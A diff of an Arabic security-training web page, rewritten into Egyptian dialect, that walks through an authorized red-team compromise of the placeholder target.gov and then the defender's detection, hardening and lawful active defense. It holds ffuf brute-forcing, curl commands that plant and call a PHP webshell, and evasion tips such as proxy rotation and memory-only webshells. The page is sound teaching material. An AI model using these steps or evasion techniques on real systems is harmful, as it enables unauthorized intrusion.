@@ -7,21 +7,22 @@ export default function Page() {
       <L
         ar={
           <>
-            <Section title="السيناريو — هجوم كامل على target.gov">
+            <Section title="السيناريو الكامل — اختراق target.gov من الصفر للـ backdoor">
               <Analogy>
-                هذا الدرس ليس قائمة أوامر. هو <b>قصة كاملة</b>: فريق أحمر مفوّض يخترق بوابة حكومية وهمية اسمها
-                <span className="eng"> target.gov</span> من الصفر إلى الباب الخلفي، ثم يُعاد نفس الفيلم بعدسة الفريق الأزرق:
-                ماذا رأى SOC؟ أي تنبيه أُطلق؟ كيف صدّ الهجوم؟ و كيف يُنفّذ <b>الرد العكسي</b> — التعرّف على المهاجم،
-                خداعه، و بناء قضية إسناد قانونية.
+                الدرس ده مش list of commands.
+                ده <b>فيلم كامل</b>.
+                red team عنده تصريح بيخترق بوابة حكومية وهمية اسمها <span className="eng">target.gov</span>، من أول packet لحد الـ backdoor الأخير.
+                وبعدين بنرجّع الشريط من بعدسة الـ blue team: الـ SOC شاف ايه؟ ايه الـ alerts اللي ضربت؟ ايه اللي مرّ بدون ما يحس بيه حد؟
+                وأخيراً، الـ <b>Active Defense</b> — مش "hack back" — كيف نخدع الـ adversary، نلمّ TTPs، ونبني قضية attribution على القانون.
               </Analogy>
-              <Callout kind="danger" title="تنبيه قانوني">
-                هذا السيناريو على هدف وهمي (<span className="eng">target.gov</span> — RFC 2606) ضمن تدريب حكومي مفوّض.
-                تنفيذ أي خطوة هنا ضد أصل حقيقي بدون تفويض مكتوب صريح = جريمة جنائية. الـ Active Defense (الرد العكسي)
-                تحديداً منطقة قانونية حساسة — لا تتجاوز شبكتك إلا بأمر قضائي أو ضمن إطار CFAA / تشريعات بلدك.
+              <Callout kind="danger" title="قبل ما تكمّل">
+                السيناريو ده على <span className="eng">target.gov</span> (RFC 2606، نطاق وهمي محجوز للتعليم) في تدريب حكومي معتمد.
+                لو نفّذت أي خطوة منها على asset حقيقي بدون تصريح كتابي — ده مش red teaming، ده crime.
+                الـ Active Defense تحديداً منطقة قانونية حساسة. ما تخرجش من شبكتك من غير أمر قضائي. CFAA الأمريكي وقوانين الـ ITIDA المصري الاتنين بياكلوا فيها.
               </Callout>
               <p className="opacity-80">
-                الإطار: Cyber Kill Chain لـ Lockheed (Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions)،
-                مع خرائط MITRE ATT&CK لكل خطوة. الفريق الأزرق يُمسك بنا في 4 نقاط محتملة — هدفنا أن نفهمها جميعاً.
+                الإطار: Cyber Kill Chain من Lockheed (Recon -&gt; Weaponize -&gt; Deliver -&gt; Exploit -&gt; Install -&gt; C2 -&gt; Actions)،
+                + ATT&amp;CK mapping لكل خطوة. الـ blue team عندنا 4 نقاط محتملة يلاقطنا فيها. هدفنا نشوفها كلها قبل ما نمشي.
               </p>
             </Section>
 
@@ -75,10 +76,11 @@ ffuf -u https://www.target.gov/FUZZ \\
      -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \\
      -mc 200,301,401,403 -t 20 -p 0.3
 # /admin, /api/v1, /backup.zip, /.git/HEAD ...`}</Code>
-                <Callout kind="warn" title="نقطة كشف #1">
-                  الـ WAF يرى نمط <span className="eng">ffuf</span> فوراً (User-Agent، rate، 404 spike).
-                  محترف: يُغيّر User-Agent، يستخدم <span className="eng">--delay</span>، يدور IPs عبر
-                  <span className="eng"> proxychains + residential proxies</span>.
+                <Callout kind="warn" title="نقطة كشف #1 — هنا الـ junior بيتقبض عليه">
+                  الـ WAF بيشوف pattern الـ ffuf من 7 سواقي: User-Agent default، rate ثابت، 404 burst.
+                  الـ junior بيشغّل ffuf مباشرة من VPS واحد. الـ blue team بيشوفه قبل ما القهوة تبرد.
+                  الـ professional: User-Agent رياليستي، <span className="eng">--delay</span> عشوائي، rotation على residential proxies (Bright Data, Smartproxy).
+                  وحتى كده، لو الـ WAF شاطر هتاكلها. السكة الأنضف: تتعلم من JS bundles وما تـ bruteforce-ش أصلاً.
                 </Callout>
               </Step>
 
@@ -132,10 +134,10 @@ curl -X POST https://portal.target.gov/api/upload \\
 # 4. تأكيد التنفيذ
 curl "https://portal.target.gov/uploads/x.php?cmd=id"
 # → uid=33(www-data) gid=33(www-data) groups=33(www-data)`}</Code>
-                <Callout kind="warn" title="نقطة كشف #2">
-                  رفع ملف <span className="eng">.php</span> في مسار uploads = توقيع نموذجي للـ EDR/WAF.
-                  محترف: يستخدم webshell بصيغة <span className="eng">.phtml</span> أو يُحقن في ملف موجود،
-                  أو يستخدم <b>memory-only payload</b> (Behinder, AntSword obfuscated).
+                <Callout kind="warn" title="نقطة كشف #2 — رفع .php في uploads = إعلان حضور">
+                  رفع <span className="eng">.php</span> في مجلد uploads = signature معروف من 15 سنة. أي EDR أو WAF محترم بيلاقطه.
+                  السكة الشاطرة: webshell بـ <span className="eng">.phtml</span> لو الـ Apache config بيشغّلها، أو حقن في ملف موجود (less filesystem changes)،
+                  أو الأصح: <b>memory-only payload</b> زي Behinder أو AntSword بـ encrypted comms. ما يفضلش على الديسك حاجة.
                 </Callout>
               </Step>
 
@@ -214,10 +216,12 @@ if(isset($_SERVER['HTTP_X_FWD_VER']) &&
                 </ul>
               </Step>
 
-              <Callout kind="danger" title="ما لا نفعله أبداً">
-                لا نُسرّب بيانات حقيقية خارج المختبر. لا نُشغّل ransomware/wiper. لا نلمس
-                <span className="eng"> SCADA/PROD-DB</span> المحظورة. لا نترك الباب الخلفي بعد انتهاء النافذة —
-                ننظّفه و نُسلّم وثيقة "Cleanup Verification" للجهة.
+              <Callout kind="danger" title="حدود حمراء — مش بنتفاوض عليها">
+                اوعى تسرّب data حقيقية برّه الـ engagement.
+                اوعى تشغّل ransomware ولا wiper تحت أي ظرف.
+                اوعى تلمس <span className="eng">SCADA/PROD-DB</span> اللي في الـ exclusion list.
+                اوعى تسيب backdoor بعد ما الـ window يقفل — كل واحدة بتتنضّف، وبتسلّم Cleanup Verification document للعميل، وبيوقّع عليها.
+                ده الفرق بين red teamer محترم وبين مجرم معاه permission slip.
               </Callout>
             </Section>
 
@@ -277,9 +281,10 @@ TLS handshake من /tmp/.X11-cache ≠ توقيع متصفّح أو curl معت�
 # DNS
 استعلام عن cdn-redteam.example من خادم production
   → ASN غير معروف، عُمر النطاق < 30 يوم = إنذار`}</Code>
-                <Callout kind="good" title="القاعدة الذهبية">
-                  خادم production لا يجب أن يبدأ اتصالات صادرة <b>إلا</b> لقائمة بيضاء معروفة (apt mirrors،
-                  cloud APIs، NTP). أي شيء آخر = حادث حتى يُثبَت العكس.
+                <Callout kind="good" title="اكتبها على الحيطة">
+                  السيرفر في production مش لازم يبدأ outbound connection <b>غير</b> لـ allowlist واضحة (apt mirrors، cloud APIs، NTP، DNS).
+                  أي connection تانية = incident لحد ما تثبت العكس.
+                  ده اللي اسمه egress filtering. ومحدش بيعمله. ومحدش بيلاقط الـ C2 بسببه. وبعدين بيستغربوا.
                 </Callout>
               </Step>
 
@@ -299,13 +304,14 @@ SELECT * FROM authorized_keys WHERE uid != <expected>;`}</Code>
               </Step>
             </Section>
 
-            <Section title="الجزء الثالث — الدفاع: كيف نُغلق هذه السلسلة">
-              <Callout kind="good" title="الدفاع متعدد الطبقات (Defense in Depth)">
-                لا توجد رصاصة فضية. كل طبقة هنا قد تُكسر — لكن كسر الخمس طبقات معاً مكلف جداً للمهاجم.
+            <Section title="الجزء الثالث — الحماية: كيف نُغلق هذه السلسلة">
+              <Callout kind="good" title="Defense in Depth — مفيش طبقة واحدة بتكفي">
+                مفيش silver bullet. كل طبقة هنا ممكن تتكسر لوحدها. بس كسر الخمسة مع بعض = مكلف جداً للـ adversary.
+                ده الـ economics بتاع الـ defense. مش "أمنع الكل"، ده "أخلّي الاختراق غالي بحيث ما يستحقش".
               </Callout>
 
               <TwoCol>
-                <Card title="طبقة 1 — تقليل سطح الهجوم" color="blue">
+                <Card title="طبقة 1 — تقليل الأبواب اللي قدامه" color="blue">
                   <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                     <li>مراجعة دورية لـ <span className="eng">crt.sh</span> — لا شهادات لنطاقات غير معتمدة.</li>
                     <li>حظر الوصول إلى <span className="eng">.git/, .env, .svn/</span> على مستوى reverse proxy.</li>
@@ -357,9 +363,13 @@ SELECT * FROM authorized_keys WHERE uid != <expected>;`}</Code>
             </Section>
 
             <Section title="الجزء الرابع — الرد العكسي (Active Defense)">
-              <Callout kind="danger" title="حدود قانونية صارمة">
-                "Hack back" — اختراق المهاجم — <b>غير قانوني</b> في أغلب الولايات القضائية بما فيها CFAA الأمريكي.
-                الرد العكسي المسموح يقع في 3 فئات: (1) داخل شبكتك، (2) خداع، (3) تعاون قانوني مع جهات إنفاذ.
+              <Callout kind="danger" title="خط أحمر قانوني">
+                "Hack back" يعني تخترق اللي مخترقك = <b>مش قانوني</b> في 95% من الـ jurisdictions، بما فيهم CFAA الأمريكي.
+                الـ Active Defense المسموح بيقع في 3 فئات بس:
+                (1) جوّه شبكتك — honeytokens, sinkholing, deception.
+                (2) خداع — تطعمه بيانات وهمية مع canary tokens.
+                (3) تعاون قانوني مع جهات إنفاذ — CERTs, FBI, Interpol.
+                الفرق دقيق ومهم. لو ما تأكدتش، اسأل محامي مختص قبل ما تنفّذ.
               </Callout>
 
               <TwoCol>
@@ -397,15 +407,16 @@ SELECT * FROM authorized_keys WHERE uid != <expected>;`}</Code>
                 </Card>
               </TwoCol>
 
-              <Callout kind="good" title="مثال عملي — كيف اكتُشفت SolarWinds">
-                Mandiant (FireEye) لم تُخترق المهاجم. اكتشفوا beacon جديد، تتبّعوه، وجدوا backdoor في
-                <span className="eng"> SolarWinds Orion</span>، ثم نشروا الـ IoCs عبر القنوات الرسمية.
-                هذا هو الرد العكسي الفعّال: <b>كشف، احتواء، إسناد عبر القنوات الشرعية.</b>
+              <Callout kind="good" title="قصة حقيقية — إزاي اتكشفت SolarWinds؟">
+                Mandiant (FireEye وقتها) ما اخترقوش الـ adversary. لاقوا beacon غريب على شبكتهم هم.
+                لمّوه. تتبّعوه. لقوه بيخرج من DLL في SolarWinds Orion update. خلاص — السكة وضحت.
+                نشروا IoCs عبر القنوات الرسمية. الـ industry كله تحرّك في 24 ساعة.
+                ده الـ Active Defense الفعّال: detect -&gt; contain -&gt; attribute -&gt; share. مفيش حركة hack-back. وكان أكتر اختراق effective في تاريخ الـ industry response.
               </Callout>
             </Section>
 
             <Section title="خلاصة — الجدول الكامل">
-              <Code lang="text">{`المرحلة         الفعل (أحمر)              الأثر (أزرق)              الدفاع
+              <Code lang="text">{`المرحلة         الفعل (أحمر)              الأثر (أزرق)              الحماية
 ────────────────────────────────────────────────────────────────────────
 Recon           crt.sh, github dorks       —                       حذف الأسرار من Git
 Scanning        ffuf, nuclei               WAF: 4xx burst          rate limit + IP rep
@@ -417,9 +428,21 @@ Actions         سحب hashes                 DB egress شاذ           DLP + c
 
 Active Defense: honeytokens → اكتشاف فوري | sinkhole → جمع TTPs | CERT → takedown`}</Code>
               <p className="opacity-80 mt-3">
-                الدرس الأهم: <b>المهاجم يحتاج النجاح مرة واحدة، المدافع كل مرة</b> — لكن المدافع لديه
-                ميزة <b>اللاتماثل المعاكس</b>: المهاجم يحتاج إخفاء كل أثر، المدافع يحتاج تنبيهاً واحداً صحيحاً.
+                الكلام اللي بيتقال: "المهاجم محتاج ينجح مرة، المدافع محتاج ينجح كل مرة". صحيح بس ناقص.
+                الـ asymmetry المعاكسة: <b>المهاجم محتاج يخفي كل أثر، المدافع محتاج alert واحد صح</b>.
+                واللي بيخسر هو اللي بيـ ignore الـ alert الواحد ده.
               </p>
+            </Section>
+
+            <Section title="الخلاصة الناشفة">
+              <p>
+                الفيلم ده مش flex. ده تذكرة. الـ red team بيشتغل بـ playbook معروف. الـ blue team عنده 4-5 نقط ممكن يلاقطه فيها.
+              </p>
+              <p>
+                واللي بيحصل فعلياً — وأنا شفته بعيني — إن أغلب الـ alerts في الـ SOC بتروح في sleep لأن الـ analyst تعبان أو الـ rule noisy.
+                الـ adversary بيعدّي مش لأنه شاطر. بيعدّي لأن الـ defender بيتفرّج مش بيراقب.
+              </p>
+              <p>الفرق بين اتنين: hunting culture، egress filtering، ETW + Sysmon + identity logs مع بعض، و SOAR بيشتغل automatically. الباقي تفاصيل.</p>
             </Section>
 
             <Section title="مراجع و قراءة إضافية">
